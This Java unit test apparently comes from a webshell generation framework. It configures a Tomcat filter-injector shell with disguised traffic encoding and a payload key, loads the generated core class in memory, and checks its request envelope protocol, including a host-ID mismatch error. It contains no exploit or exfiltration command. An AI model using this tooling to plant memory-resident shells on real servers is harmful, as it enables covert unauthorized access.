package org.leo.jmg;

import org.junit.jupiter.api.Test;
import org.leo.core.entity.Disguise;
import org.leo.core.payload.PayloadCodec;
import org.leo.jmg.core.LeoCore;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

class EnvelopeCoreCompatibilityTest {

    @Test
    void generatedCoreExecutesEnvelopeRequest() throws Exception {
        Disguise request = new Disguise();
        request.setTrafficDecodeBody(
                "public byte[] decodeTraffic(byte[] data){return data;}");
        Disguise response = new Disguise();
        response.setTrafficEncodeBody(
                "public byte[] encodeTraffic(byte[] data){return data;}");
        ShellGeneratorConfig config = ShellGeneratorConfig.builder(request, response)
                .payloadKey("envelope-test-key")
                .coreClassName("org.example.EnvelopeCore")
                .shellClassName("org.example.EnvelopeShell")
                .injectorClassName("org.example.EnvelopeInjector")
                .header("X-Test", "envelope")
                .serverType("Tomcat")
                .shellType("FilterInjector")
                .packerType("DefaultBase64")
                .build();
        byte[] bytecode = new LeoCore(request, response, "envelope-test-key")
                .genLeoCoreByClassName(config.getCoreClassName(), config);
        Object core = new Loader().define(bytecode).getDeclaredConstructor().newInstance();

        Map<String, Object> envelope = new HashMap<>();
        envelope.put("requestId", "request-1");
        envelope.put("operation", "PING");
        envelope.put("params", new HashMap<>());
        Map<String, Object> envelopeResponse = invoke(core, envelope);
        assertEquals("request-1", envelopeResponse.get("requestId"));
        assertEquals(200, envelopeResponse.get("code"));
        assertTrue(envelopeResponse.get("data") instanceof Map<?, ?>);
        assertTrue(((Map<?, ?>) envelopeResponse.get("data")).containsKey("hostId"));

        String actualHostId = String.valueOf(((Map<?, ?>) envelopeResponse.get("data")).get("hostId"));
        Map<String, Object> wrongHostRequest = new HashMap<>();
        wrongHostRequest.put("requestId", "request-2");
        wrongHostRequest.put("operation", "COMPONENT_INVOKE");
        wrongHostRequest.put("hostId", "wrong-" + actualHostId);
        wrongHostRequest.put("component", "MissingComponent");
        wrongHostRequest.put("action", "run");
        wrongHostRequest.put("params", new HashMap<>());

        Map<String, Object> mismatch = invoke(core, wrongHostRequest);
        assertEquals(409, mismatch.get("code"));
        assertTrue(mismatch.get("error") instanceof Map<?, ?>);
        Map<?, ?> error = (Map<?, ?>) mismatch.get("error");
        assertEquals("HOST_ID_MISMATCH", error.get("errorCode"));
        assertEquals(actualHostId, error.get("hostId"));
    }

    @SuppressWarnings("unchecked")
    private Map<String, Object> invoke(Object core, Map<String, Object> request) throws Exception {
        ByteArrayOutputStream wire = new ByteArrayOutputStream();
        wire.write(new PayloadCodec("envelope-test-key").encode(request));
        try {
            ((InvocationHandler) core).invoke(null, null, new Object[]{wire});
        } catch (Throwable e) {
            throw new AssertionError("Core invocation failed", e);
        }
        return (Map<String, Object>) new PayloadCodec("envelope-test-key")
                .decode(wire.toByteArray());
    }

    private static final class Loader extends ClassLoader {
        private Class<?> define(byte[] bytecode) {
            return defineClass(null, bytecode, 0, bytecode.length);
        }
    }
}
